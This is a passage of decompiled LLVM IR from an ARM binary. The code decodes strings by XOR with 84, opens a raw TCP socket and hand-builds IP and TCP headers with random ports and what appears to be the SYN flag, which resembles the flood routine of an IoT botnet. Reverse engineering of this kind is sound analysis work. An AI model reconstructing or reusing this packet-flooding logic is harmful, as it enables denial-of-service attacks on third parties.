  br label %dec_label_pc_e3bc

dec_label_pc_e34c:                                ; preds = %dec_label_pc_e304
  %v2_e310 = ptrtoint i32* %stack_var_-32 to i32
  %v0_e34c = load i32, i32* %r5.global-to-local, align 4
  %v1_e34c = add i32 %v0_e34c, 28
  store i32 %v1_e34c, i32* @r0, align 4
  %v0_e350 = load i32, i32* %r6.global-to-local, align 4
  %v2_e350 = add i32 %v0_e34c, 24
  %v3_e350 = inttoptr i32 %v2_e350 to i32*
  store i32 %v0_e350, i32* %v3_e350, align 4
  store i32 256, i32* @r1, align 4
  %v0_e358 = call i32 @function_101b4()
  store i32 %v0_e358, i32* %r0.global-to-local, align 4
  %v0_e35c = load i32, i32* %r5.global-to-local, align 4
  %v1_e35c = add i32 %v0_e35c, 4
  %v2_e35c = inttoptr i32 %v1_e35c to i32*
  %v3_e35c = load i32, i32* %v2_e35c, align 4
  store i32 %v3_e35c, i32* %r4.global-to-local, align 4
  %v0_e360 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_e360, i32* %r2.global-to-local, align 4
  store i32 %v3_e35c, i32* %r0.global-to-local, align 4
  %v2_e36c = call i32 @function_10a14(i32 %v3_e35c, i32 3)
  %v1_e374 = or i32 %v2_e36c, 2048
  store i32 %v1_e374, i32* %r2.global-to-local, align 4
  %v0_e378 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e378, i32* %r0.global-to-local, align 4
  %v2_e37c = call i32 @function_10a14(i32 %v0_e378, i32 4)
  store i32 %v2_e37c, i32* %r0.global-to-local, align 4
  %v2_e384 = load i32, i32* @global_var_1e74c.119, align 4
  store i32 %v2_e384, i32* %r2.global-to-local, align 4
  %v1_e38c = load i32, i32* %r5.global-to-local, align 4
  %v2_e38c = add i32 %v1_e38c, 12
  %v3_e38c = inttoptr i32 %v2_e38c to i32*
  store i32 1, i32* %v3_e38c, align 4
  store i32 2, i32* @r3, align 4
  store i32 2, i32* %stack_var_-32, align 4
  %v0_e398 = load i32, i32* %r2.global-to-local, align 4
  %v1_e398 = load i32, i32* %r5.global-to-local, align 4
  %v2_e398 = add i32 %v1_e398, 8
  %v3_e398 = inttoptr i32 %v2_e398 to i32*
  store i32 %v0_e398, i32* %v3_e398, align 4
  %v0_e39c = load i32, i32* %r5.global-to-local, align 4
  %v1_e39c = add i32 %v0_e39c, 16
  %v2_e39c = inttoptr i32 %v1_e39c to i32*
  %v3_e39c = load i32, i32* %v2_e39c, align 4
  store i32 %v3_e39c, i32* @ip, align 4
  %v1_e3a0 = add i32 %v0_e39c, 4
  %v2_e3a0 = inttoptr i32 %v1_e3a0 to i32*
  %v3_e3a0 = load i32, i32* %v2_e3a0, align 4
  store i32 %v3_e3a0, i32* %r0.global-to-local, align 4
  %v1_e3a4 = add i32 %v0_e39c, 20
  %v2_e3a4 = inttoptr i32 %v1_e3a4 to i16*
  %v3_e3a4 = load i16, i16* %v2_e3a4, align 2
  %v4_e3a4 = zext i16 %v3_e3a4 to i32
  store i32 %v4_e3a4, i32* %r5.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e3b8 = call i32 @function_111a4(i32 %v3_e3a0, i32 %v2_e310, i32 16)
  store i32 %v3_e3b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e3bc

dec_label_pc_e3bc:                                ; preds = %dec_label_pc_e304.dec_label_pc_e3bc_crit_edge, %dec_label_pc_e34c
  %v1_e3c4 = phi i32 [ %v1_e3c4.pre, %dec_label_pc_e304.dec_label_pc_e3bc_crit_edge ], [ %v3_e3b8, %dec_label_pc_e34c ]
  %v2_e3c0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e3c0, i32* @r4, align 4
  store i32 %v12_e304, i32* @lr, align 4
  ret i32 %v1_e3c4

; uselistorder directives
  uselistorder i32 %v3_e33c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 5, 8, 9, 7, 6 }
  uselistorder i32 ()* @function_101b4, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e3bc, { 1, 0 }
}

define i32 @function_e3cc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_e3cc:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_e3cc = load i32, i32* @r4, align 4
  %v6_e3cc = load i32, i32* @r5, align 4
  %v9_e3cc = load i32, i32* @r6, align 4
  %v12_e3cc = load i32, i32* @r7, align 4
  %v15_e3cc = load i32, i32* @r8, align 4
  %v18_e3cc = load i32, i32* @sb, align 4
  %v21_e3cc = load i32, i32* @sl, align 4
  %v24_e3cc = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_1e718.121 to i32), i32* @fp, align 4
  %v2_e3d4 = load i32, i32* @global_var_1e718.121, align 4
  store i32 ptrtoint (i32* @global_var_1e744.123 to i32), i32* @sl, align 4
  %v1_e3e0 = add i32 %v2_e3d4, 1
  store i32 %v1_e3e0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_e3ec = load i32, i32* @global_var_1e744.123, align 4
  store i32 %v2_e3ec, i32* %r0.global-to-local, align 4
  %v3_e3f0 = mul i32 %v1_e3e0, 16
  store i32 %v3_e3f0, i32* %r1.global-to-local, align 4
  %v4_e3f8 = inttoptr i32 %v2_e3ec to i32*
  %v5_e3f8 = call i32 @function_12058(i32* %v4_e3f8, i32 %v3_e3f0, i32 %arg3, i32 %v1_e3e0)
  %v2_e3fc = load i32, i32* @global_var_1e718.121, align 4
  store i32 %v2_e3fc, i32* %r2.global-to-local, align 4
  store i32 %v5_e3f8, i32* @r8, align 4
  %v0_e404 = load i32, i32* @r5, align 4
  store i32 %v0_e404, i32* %r0.global-to-local, align 4
  %v1_e40c = load i32, i32* @sl, align 4
  %v2_e40c = inttoptr i32 %v1_e40c to i32*
  store i32 %v5_e3f8, i32* %v2_e40c, align 4
  %v1_e410 = inttoptr i32 %v0_e404 to i8*
  %v2_e410 = call i32 @function_10120(i8* %v1_e410)
  %sext = mul i32 %v2_e410, 16777216
  %v1_e414 = sdiv i32 %sext, 16777216
  %v2_e414 = add nsw i32 %v1_e414, 1
  store i32 %v2_e414, i32* @r4, align 4
  store i32 %v1_e414, i32* @r7, align 4
  store i32 %v2_e414, i32* %r0.global-to-local, align 4
  %v1_e420 = call i32 @function_11604(i32 %v2_e414)
  store i32 %v1_e420, i32* %r0.global-to-local, align 4
  %v0_e424 = load i32, i32* @r5, align 4
  store i32 %v0_e424, i32* %r1.global-to-local, align 4
  %v0_e428 = load i32, i32* @r4, align 4
  store i32 %v0_e428, i32* %r2.global-to-local, align 4
  store i32 %v1_e420, i32* %r6.global-to-local, align 4
  %v3_e430 = call i32 @function_10190(i32 %v1_e420, i32 %v0_e424, i32 %v0_e428)
  store i32 %v3_e430, i32* %r0.global-to-local, align 4
  %v0_e434 = load i32, i32* @r7, align 4
  %tmp22 = icmp slt i32 %v0_e434, 1
  %extract.t6 = trunc i32 %v0_e434 to i8
  br i1 %tmp22, label %dec_label_pc_e458, label %dec_label_pc_e43c

dec_label_pc_e43c:                                ; preds = %dec_label_pc_e3cc
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e440

dec_label_pc_e440:                                ; preds = %dec_label_pc_e440, %dec_label_pc_e43c
  %v2_e448 = phi i32 [ %v1_e44c, %dec_label_pc_e440 ], [ 0, %dec_label_pc_e43c ]
  %v1_e440 = load i32, i32* %r6.global-to-local, align 4
  %v2_e440 = add i32 %v1_e440, %v2_e448
  %v3_e440 = inttoptr i32 %v2_e440 to i8*
  %v4_e440 = load i8, i8* %v3_e440, align 1
  %v6_e440 = zext i8 %v4_e440 to i32
  %v1_e444 = xor i32 %v6_e440, 84
  store i32 %v1_e444, i32* %r3.global-to-local, align 4
  %v1_e448 = trunc i32 %v1_e444 to i8
  store i8 %v1_e448, i8* %v3_e440, align 1
  %v0_e44c = load i32, i32* %r2.global-to-local, align 4
  %v1_e44c = add i32 %v0_e44c, 1
  store i32 %v1_e44c, i32* %r2.global-to-local, align 4
  %v1_e450 = load i32, i32* @r7, align 4
  %v9_e450 = icmp eq i32 %v1_e44c, %v1_e450
  br i1 %v9_e450, label %dec_label_pc_e458.loopexit, label %dec_label_pc_e440

dec_label_pc_e458.loopexit:                       ; preds = %dec_label_pc_e440
  %extract.t = trunc i32 %v1_e44c to i8
  br label %dec_label_pc_e458

dec_label_pc_e458:                                ; preds = %dec_label_pc_e458.loopexit, %dec_label_pc_e3cc
  %v0_e468.off0 = phi i8 [ %extract.t, %dec_label_pc_e458.loopexit ], [ %extract.t6, %dec_label_pc_e3cc ]
  %v2_e458 = load i32, i32* @global_var_1e718.121, align 4
  %v2_e45c = load i32, i32* @global_var_1e744.123, align 4
  %v3_e460 = mul i32 %v2_e458, 16
  store i32 %v3_e460, i32* @sb, align 4
  %v2_e464 = add i32 %v2_e45c, %v3_e460
  store i32 %v2_e464, i32* %r2.global-to-local, align 4
  %v3_e468 = add i32 %v2_e464, 12
  %v4_e468 = inttoptr i32 %v3_e468 to i8*
  store i8 %v0_e468.off0, i8* %v4_e468, align 1
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_e3fc, i32* %r3.global-to-local, align 4
  %v0_e474 = load i32, i32* %r6.global-to-local, align 4
  %v1_e474 = load i32, i32* @r8, align 4
  %v5_e474 = mul i32 %v2_e3fc, 16
  %v6_e474 = add i32 %v1_e474, %v5_e474
  %v7_e474 = inttoptr i32 %v6_e474 to i32*
  store i32 %v0_e474, i32* %v7_e474, align 4
  %v2_e478 = load i32, i32* @global_var_1e744.123, align 4
  store i32 %v2_e478, i32* @r7, align 4
  %v1_e47c = inttoptr i32 %arg2 to i8*
  %v2_e47c = call i32 @function_10120(i8* %v1_e47c)
  %sext1 = mul i32 %v2_e47c, 16777216
  %v1_e480 = sdiv i32 %sext1, 16777216
  %v2_e480 = add nsw i32 %v1_e480, 1
  store i32 %v2_e480, i32* @r4, align 4
  store i32 %v1_e480, i32* @r6, align 4
  store i32 %v2_e480, i32* %r0.global-to-local, align 4
  %v1_e48c = call i32 @function_11604(i32 %v2_e480)
  store i32 %v1_e48c, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_e494 = load i32, i32* @r4, align 4
  store i32 %v0_e494, i32* %r2.global-to-local, align 4
  store i32 %v1_e48c, i32* %r5.global-to-local, align 4
  %v3_e49c = call i32 @function_10190(i32 %v1_e48c, i32 %arg2, i32 %v0_e494)
  store i32 %v3_e49c, i32* %r0.global-to-local, align 4
  %v0_e4a0 = load i32, i32* @r6, align 4
  %tmp23 = icmp slt i32 %v0_e4a0, 1
  %extract.t8 = trunc i32 %v0_e4a0 to i8
  br i1 %tmp23, label %dec_label_pc_e4c4, label %dec_label_pc_e4a8

dec_label_pc_e4a8:                                ; preds = %dec_label_pc_e458
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e4ac

dec_label_pc_e4ac:                                ; preds = %dec_label_pc_e4ac, %dec_label_pc_e4a8
  %v2_e4b4 = phi i32 [ %v1_e4b8, %dec_label_pc_e4ac ], [ 0, %dec_label_pc_e4a8 ]
  %v1_e4ac = load i32, i32* %r5.global-to-local, align 4
  %v2_e4ac = add i32 %v1_e4ac, %v2_e4b4
  %v3_e4ac = inttoptr i32 %v2_e4ac to i8*
  %v4_e4ac = load i8, i8* %v3_e4ac, align 1
  %v6_e4ac = zext i8 %v4_e4ac to i32
  %v1_e4b0 = xor i32 %v6_e4ac, 84
  store i32 %v1_e4b0, i32* %r3.global-to-local, align 4
  %v1_e4b4 = trunc i32 %v1_e4b0 to i8
  store i8 %v1_e4b4, i8* %v3_e4ac, align 1
  %v0_e4b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_e4b8 = add i32 %v0_e4b8, 1
  store i32 %v1_e4b8, i32* %r2.global-to-local, align 4
  %v1_e4bc = load i32, i32* @r6, align 4
  %v9_e4bc = icmp eq i32 %v1_e4b8, %v1_e4bc
  br i1 %v9_e4bc, label %dec_label_pc_e4c4.loopexit, label %dec_label_pc_e4ac

dec_label_pc_e4c4.loopexit:                       ; preds = %dec_label_pc_e4ac
  %extract.t7 = trunc i32 %v1_e4b8 to i8
  br label %dec_label_pc_e4c4

dec_label_pc_e4c4:                                ; preds = %dec_label_pc_e4c4.loopexit, %dec_label_pc_e458
  %v0_e4d4.off0 = phi i8 [ %extract.t7, %dec_label_pc_e4c4.loopexit ], [ %extract.t8, %dec_label_pc_e458 ]
  %v2_e4c4 = load i32, i32* @global_var_1e718.121, align 4
  store i32 %v2_e4c4, i32* %r0.global-to-local, align 4
  %v2_e4c8 = load i32, i32* @global_var_1e744.123, align 4
  %v3_e4cc = mul i32 %v2_e4c4, 16
  store i32 %v3_e4cc, i32* %r1.global-to-local, align 4
  %v2_e4d0 = or i32 %v3_e4cc, 13
  %v3_e4d4 = add i32 %v2_e4d0, %v2_e4c8
  %v4_e4d4 = inttoptr i32 %v3_e4d4 to i8*
  store i8 %v0_e4d4.off0, i8* %v4_e4d4, align 1
  store i32 ptrtoint (i16** @global_var_1e748.125 to i32), i32* %r4.global-to-local, align 4
  %v2_e4e0 = load i16, i16* bitcast (i16** @global_var_1e748.125 to i16*), align 4
  %v3_e4e0 = zext i16 %v2_e4e0 to i32
  store i32 %v3_e4e0, i32* %lr.global-to-local, align 4
  %v2_e4e8 = load i32, i32* @global_var_1e744.123, align 4
  store i32 %v2_e4e8, i32* %r2.global-to-local, align 4
  %v0_e4f0 = load i32, i32* %r1.global-to-local, align 4
  %v2_e4f0 = add i32 %v0_e4f0, %v2_e4e8
  store i32 %v2_e4f0, i32* %r1.global-to-local, align 4
  store i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_1e748.125 to i32), i32 16), i32 16), i32* %r3.global-to-local, align 4
  %v0_e4f8 = load i32, i32* @sb, align 4
  %v1_e4f8 = load i32, i32* @r7, align 4
  %v2_e4f8 = add i32 %v1_e4f8, %v0_e4f8
  store i32 %v2_e4f8, i32* %ip.global-to-local, align 4
  %v0_e4fc = load i32, i32* %r0.global-to-local, align 4
  %v1_e4fc = add i32 %v0_e4fc, 1
  store i32 %v1_e4fc, i32* %r0.global-to-local, align 4
  %v3_e500 = add i32 %v2_e4f0, 10
  %v4_e500 = inttoptr i32 %v3_e500 to i16*
  store i16 trunc (i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_1e748.125 to i32), i32 16), i32 16) to i16), i16* %v4_e500, align 2
  %v0_e504 = load i32, i32* %lr.global-to-local, align 4
  %v1_e504 = trunc i32 %v0_e504 to i16
  %v2_e504 = load i32, i32* %r1.global-to-local, align 4
  %v3_e504 = add i32 %v2_e504, 8
  %v4_e504 = inttoptr i32 %v3_e504 to i16*
  store i16 %v1_e504, i16* %v4_e504, align 2
  %v0_e508 = load i32, i32* %r5.global-to-local, align 4
  %v1_e508 = load i32, i32* %ip.global-to-local, align 4
  %v2_e508 = add i32 %v1_e508, 4
  %v3_e508 = inttoptr i32 %v2_e508 to i32*
  store i32 %v0_e508, i32* %v3_e508, align 4
  %v1_e50c = load i32, i32* @fp, align 4
  %v2_e50c = inttoptr i32 %v1_e50c to i32*
  store i32 %v1_e4fc, i32* %v2_e50c, align 4
  %v0_e510 = load i32, i32* %r3.global-to-local, align 4
  %v1_e510 = trunc i32 %v0_e510 to i16
  %v2_e510 = load i32, i32* %r4.global-to-local, align 4
  %v3_e510 = inttoptr i32 %v2_e510 to i16*
  store i16 %v1_e510, i16* %v3_e510, align 2
  store i32 %v3_e3cc, i32* @r4, align 4
  store i32 %v6_e3cc, i32* @r5, align 4
  store i32 %v9_e3cc, i32* @r6, align 4
  store i32 %v12_e3cc, i32* @r7, align 4
  store i32 %v15_e3cc, i32* @r8, align 4
  store i32 %v18_e3cc, i32* @sb, align 4
  store i32 %v21_e3cc, i32* @sl, align 4
  store i32 %v24_e3cc, i32* @fp, align 4
  ret i32 %v1_e4fc

; uselistorder directives
  uselistorder i32 %v3_e4cc, { 1, 0 }
  uselistorder i32 %v1_e4b8, { 0, 2, 3, 1 }
  uselistorder i32 %v1_e48c, { 1, 0, 2 }
  uselistorder i32 %v3_e460, { 1, 0 }
  uselistorder i32 %v1_e44c, { 0, 2, 3, 1 }
  uselistorder i32 %v1_e420, { 1, 0, 2 }
  uselistorder i32 %v2_e3fc, { 1, 0, 2 }
  uselistorder i32 %v3_e3f0, { 1, 0 }
  uselistorder i32 %v1_e3e0, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 10, 9, 11, 12, 0 }
  uselistorder i32 (i8*)* @function_10120, { 0, 1, 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
}

define i32 @function_e52c(i32 %arg1) local_unnamed_addr {
dec_label_pc_e52c:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %tmp334 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-1866 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i8, align 1
  %v6_e52c = load i32, i32* @r5, align 4
  %v0_e538 = call i32 @function_108d0()
  store i32 %v0_e538, i32* %r0.global-to-local, align 4
  %v7_e53c = icmp eq i32 %v0_e538, -1
  %. = zext i1 %v7_e53c to i32
  %tmp369 = icmp slt i32 %v0_e538, 1
  %storemerge329 = select i1 %tmp369, i32 %., i32 1
  store i32 %storemerge329, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_207a4.127 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e558 = icmp eq i32 %storemerge329, 0
  store i1 %v2_e558, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_e538, i32* @global_var_207a4.127, align 4
  br i1 %v2_e558, label %dec_label_pc_e574, label %dec_label_pc_e564

dec_label_pc_e564:                                ; preds = %dec_label_pc_e52c
  store i32 %v6_e52c, i32* @r5, align 4
  ret i32 %v0_e538

dec_label_pc_e574:                                ; preds = %dec_label_pc_e52c
  %v0_e574 = call i32 @function_103dc()
  store i32 %v0_e574, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20780.45 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_e574, i32* @global_var_20780.45, align 4
  %v1_e580 = call i32 @function_e0f0(i32 %v0_e574)
  %v0_e584 = load i32, i32* @r4, align 4
  store i32 %v0_e584, i32* %r0.global-to-local, align 4
  %v1_e588 = inttoptr i32 %v0_e584 to i32*
  %v2_e588 = call i32 @function_10860(i32* %v1_e588)
  store i32 ptrtoint (i32* @global_var_1e74c.119 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_e588, i32* @global_var_1e74c.119, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_e59c = call i32 @function_11f24(i32 256, i32 288)
  store i32 ptrtoint (i32* @global_var_2079c.131 to i32), i32* %r3.global-to-local, align 4
  %v0_e5a4 = load i32, i32* @r4, align 4
  store i32 %v0_e5a4, i32* %stack_var_-52, align 4
  store i32 %v2_e59c, i32* @global_var_2079c.131, align 4
  store i32 %v0_e5a4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e5b0

dec_label_pc_e5b0:                                ; preds = %dec_label_pc_e5b0.dec_label_pc_e5b0_crit_edge, %dec_label_pc_e574
  %v2_e5bc = phi i32 [ %v2_e5bc.pre, %dec_label_pc_e5b0.dec_label_pc_e5b0_crit_edge ], [ %v2_e59c, %dec_label_pc_e574 ]
  %v0_e5c4 = phi i32 [ %v0_e5f4, %dec_label_pc_e5b0.dec_label_pc_e5b0_crit_edge ], [ %v0_e5a4, %dec_label_pc_e574 ]
  %v3_e5b8 = mul i32 %v0_e5c4, 256
  store i32 %v3_e5b8, i32* %ip.global-to-local, align 4
  %v2_e5cc = mul i32 %v0_e5c4, 288
  %v1_e5d4 = add i32 %v0_e5c4, 1
  store i32 %v1_e5d4, i32* %r0.global-to-local, align 4
  %v2_e5d8 = add i32 %v2_e5cc, %v2_e5bc
  store i32 %v2_e5d8, i32* %r2.global-to-local, align 4
  store i32 %v2_e5d8, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r3, align 4
  %v2_e5ec = add i32 %v2_e5d8, 4
  %v3_e5ec = inttoptr i32 %v2_e5ec to i32*
  store i32 -1, i32* %v3_e5ec, align 4
  %v0_e5f0 = load i32, i32* @r5, align 4
  %v1_e5f0 = load i32, i32* %r1.global-to-local, align 4
  %v2_e5f0 = add i32 %v1_e5f0, 12
  %v3_e5f0 = inttoptr i32 %v2_e5f0 to i32*
  store i32 %v0_e5f0, i32* %v3_e5f0, align 4
  %v0_e5f4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e5f4, i32* %stack_var_-52, align 4
  %v7_e5f8 = icmp sgt i32 %v1_e5d4, 255
  br i1 %v7_e5f8, label %dec_label_pc_e5fc, label %dec_label_pc_e5b0.dec_label_pc_e5b0_crit_edge

dec_label_pc_e5b0.dec_label_pc_e5b0_crit_edge:    ; preds = %dec_label_pc_e5b0
  %v2_e5bc.pre = load i32, i32* @global_var_2079c.131, align 4
  br label %dec_label_pc_e5b0

dec_label_pc_e5fc:                                ; preds = %dec_label_pc_e5b0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v3_e608 = call i32 @function_113bc(i32 2, i32 3, i32 6)
  store i32 %v3_e608, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_207a0.133 to i32), i32* %r2.global-to-local, align 4
  %v2_e610 = icmp eq i32 %v3_e608, -1
  store i1 %v2_e610, i1* %cpsr_c.global-to-local, align 1
  %v7_e610 = icmp eq i32 %v3_e608, -1
  store i1 %v7_e610, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_e608, i32* @r4, align 4
  store i32 %v3_e608, i32* @global_var_207a0.133, align 4
  br i1 %v7_e610, label %dec_label_pc_e5fc.dec_label_pc_fbd0_crit_edge, label %dec_label_pc_e620

dec_label_pc_e5fc.dec_label_pc_fbd0_crit_edge:    ; preds = %dec_label_pc_e5fc
  %.pre283 = ptrtoint i8* %stack_var_-56 to i32
  br label %dec_label_pc_fbd0

dec_label_pc_e620:                                ; preds = %dec_label_pc_e5fc
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_e624 = load i32, i32* @r5, align 4
  store i32 %v0_e624, i32* %r2.global-to-local, align 4
  %v2_e628 = call i32 @function_10a14(i32 %v3_e608, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_e630 = or i32 %v2_e628, 2048
  store i32 %v1_e630, i32* %r2.global-to-local, align 4
  %v0_e634 = load i32, i32* @r4, align 4
  store i32 %v0_e634, i32* %r0.global-to-local, align 4
  %v2_e638 = call i32 @function_10a14(i32 %v0_e634, i32 4)
  %v2_e640 = load i32, i32* @global_var_207a0.133, align 4
  store i32 %v2_e640, i32* %r0.global-to-local, align 4
  %v2_e644 = ptrtoint i8* %stack_var_-56 to i32
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_e64c = load i32, i32* @r5, align 4
  store i32 %v0_e64c, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_e654 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_e654, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v5_e664 = call i32 @function_11378(i32 %v2_e640, i32 %v0_e64c, i32 3, i32 %v2_e654, i32 4)
  store i32 %v5_e664, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e668 = icmp eq i32 %v5_e664, 0
  store i1 %v2_e668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e668, label %dec_label_pc_e670, label %dec_label_pc_fbc4

dec_label_pc_e670:                                ; preds = %dec_label_pc_e620, %dec_label_pc_e670
  %v0_e670 = call i32 @function_e094()
  %v3_e674 = mul i32 %v0_e670, 65536
  store i32 %v3_e674, i32* %r0.global-to-local, align 4
  %v1_e67c = mul i32 %v0_e670, 256
  %v3_e680 = and i32 %v1_e67c, 65280
  %tmp372 = udiv i32 %v0_e670, 256
  %v4_e684 = urem i32 %tmp372, 256
  %v5_e684 = or i32 %v4_e684, %v3_e680
  store i32 %v5_e684, i32* %r3.global-to-local, align 4
  %v2_e688 = icmp ugt i32 %v5_e684, 1023
  store i1 %v2_e688, i1* %cpsr_c.global-to-local, align 1
  %v7_e688 = icmp eq i32 %v5_e684, 1024
  store i1 %v7_e688, i1* %cpsr_z.global-to-local, align 1
  %v3_e690 = icmp ult i32 %v5_e684, 1022
  br i1 %v3_e690, label %dec_label_pc_e670, label %dec_label_pc_e694

dec_label_pc_e694:                                ; preds = %dec_label_pc_e670
  %v5_e68c.le = trunc i32 %v0_e670 to i16
  store i32 ptrtoint (i8** @global_var_1e71c.135 to i32), i32* %r0.global-to-local, align 4
  %v2_e698 = load i8, i8* bitcast (i8** @global_var_1e71c.135 to i8*), align 4
  %v3_e698 = zext i8 %v2_e698 to i32
  %v1_e69c = and i32 %v3_e698, 240
  %v1_e6a0 = or i32 %v1_e69c, 5
  store i32 %v1_e6a0, i32* %r3.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_1e71c.135 to i8*), align 4
  store i16 10240, i16* bitcast (i32* @global_var_1e71e.136 to i16*), align 4
  %v0_e6c0 = call i32 @function_e094()
  %v1_e6c0 = trunc i32 %v0_e6c0 to i16
  %v3_e6c8 = load i8, i8* @global_var_1e73c.139, align 1
  store i32 ptrtoint (i16* @global_var_1e730.138 to i32), i32* @lr, align 4
  store i32 ptrtoint (i8** @global_var_1e71c.135 to i32), i32* %ip.global-to-local, align 4
  %v1_e6d8 = urem i8 %v3_e6c8, 16
  store i16 %v1_e6c0, i16* bitcast (i32* @global_var_1e720.140 to i16*), align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v1_e6e8 = or i8 %v1_e6d8, 80
  store i8 64, i8* bitcast (i32* @global_var_1e724.141 to i8*), align 4
  store i8 6, i8* bitcast (i32* @global_var_1e725.142 to i8*), align 4
  store i8 %v1_e6e8, i8* @global_var_1e73c.139, align 1
  %v4_e6f8 = sext i16 %v5_e68c.le to i32
  store i32 %v4_e6f8, i32* %r1.global-to-local, align 4
  store i32 5888, i32* %r0.global-to-local, align 4
  store i16 5888, i16* @global_var_1e732.143, align 2
  store i16 %v5_e68c.le, i16* @global_var_1e730.138, align 2
  %v0_e708 = call i32 @function_e094()
  %v1_e708 = trunc i32 %v0_e708 to i16
  %v3_e710 = load i8, i8* @global_var_1e73d.144, align 1
  %v4_e710 = zext i8 %v3_e710 to i32
  store i32 ptrtoint (i16* @global_var_1e730.138 to i32), i32* %ip.global-to-local, align 4
  %v1_e718 = or i32 %v4_e710, 2
  store i32 %v1_e718, i32* %r3.global-to-local, align 4
  store i16 %v1_e708, i16* bitcast (i32* @global_var_1e73e.145 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_15f70.147 to i32), i32* %r1.global-to-local, align 4
  %v1_e724 = trunc i32 %v1_e718 to i8
  store i8 %v1_e724, i8* @global_var_1e73d.144, align 1
  store i32 ptrtoint ([5 x i8]* @global_var_15f6c.149 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_e730 = call i32 @function_e3cc(i32 ptrtoint ([5 x i8]* @global_var_15f6c.149 to i32), i32 ptrtoint (i32* @global_var_15f70.147 to i32), i32 4)
